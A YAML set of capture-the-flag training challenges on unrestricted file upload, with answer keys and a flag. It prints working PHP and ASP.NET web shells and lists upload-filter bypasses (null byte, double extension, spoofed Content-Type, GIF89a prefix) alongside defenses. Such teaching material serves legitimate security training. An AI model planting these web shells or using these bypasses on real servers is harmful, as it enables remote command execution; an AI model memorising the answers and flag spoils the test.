challenges:
  - id: fu-qa-1
    type: qa
    title: "Unrestricted File Upload"
    points: 10
    content: |
      File upload features (profile pictures, attachments, etc.) are common
      attack vectors if not properly secured.

      The most dangerous scenario: allowing users to upload executable files
      that the server can then run. For example, uploading a PHP web shell:

        <?php system($_GET['cmd']); ?>

      If uploaded to the web root, visiting:
        http://site.com/uploads/shell.php?cmd=whoami
      executes the command on the server.

      File upload risks by severity:
      1. Remote Code Execution (RCE) — upload a web shell
      2. Malware Distribution — upload malicious files for others to download
      3. Server-Side Includes — upload .shtml files with SSI directives
      4. XML External Entities (XXE) — upload malicious XML files
      5. Storage Exhaustion — fill up the server's disk space

      Common defense bypasses:
      1. Extension Check: Only allow .jpg, .png
         Bypass: shell.php.jpg, shell.php%00.jpg (null byte)
      2. Content-Type Check: Check MIME type
         Bypass: Set Content-Type: image/jpeg in request
      3. Magic Bytes Check: Check file header bytes (‰PNG, ÿØÿá)
         Bypass: Add GIF89a; at start of PHP file
      4. Double Extension: shell.php.jpg
         Bypass depends on server configuration
    questions:
      - q: "What is the most severe consequence of unrestricted file upload?"
        a: "Remote Code Execution (RCE)"
      - q: "What file extension indicates a PHP script?"
        a: ".php"
      - q: "What technique adds real file headers (like GIF89a) to bypass magic byte checks?"
        a: "Magic bytes injection"

  - id: fu-qa-2
    type: qa
    title: "Web Shells"
    points: 10
    content: |
      A web shell is a script uploaded to a server that gives you a web-based
      interface to execute commands. Web shells are a common post-exploitation tool.

      Simple PHP web shell:
        <?php system($_GET['cmd']); ?>

      More sophisticated PHP web shell:
        <?php
        if(isset($_REQUEST['cmd'])){
          echo '<pre>' . shell_exec($_REQUEST['cmd']) . '</pre>';
        }
        ?>

      Simple ASP.NET web shell:
        <%@ Page Language="C#" %>
        <% Response.Write(System.Diagnostics.Process.Start(Request["cmd"]).StandardOutput.ReadToEnd()); %>

      Defense against file upload:
      1. Store uploaded files outside the web root
      2. Serve files through a script that sets proper Content-Type headers
      3. Rename uploaded files (no user-controlled filenames)
      4. Scan files for malware
      5. Disable execution in upload directories (.htaccess: RemoveHandler)
      6. Validate both extension AND content type AND file content
      7. Limit file size

      Image file signature bytes (magic bytes):
      - JPEG: FF D8 FF E0
      - PNG: 89 50 4E 47
      - GIF: 47 49 46 38
      - PDF: 25 50 44 46
    questions:
      - q: "In a PHP web shell, what function executes system commands?"
        a: "system()"
      - q: "What is the best defense: store files in the web root or outside it?"
        a: "Outside the web root"
      - q: "What are the first 4 bytes of a PNG file?"
        a: "89 50 4E 47"

  - id: fu-flag-1
    type: flag
    title: "Upload Exploit"
    points: 50
    content: |
      A website allows profile picture uploads and checks only the Content-Type header.
      It serves uploaded files from /uploads/ directory.
      Upload a PHP web shell with Content-Type: image/jpeg and read /flag.txt.
    flag: "CTF{up10ad_m3_1f_y0u_c4n}"
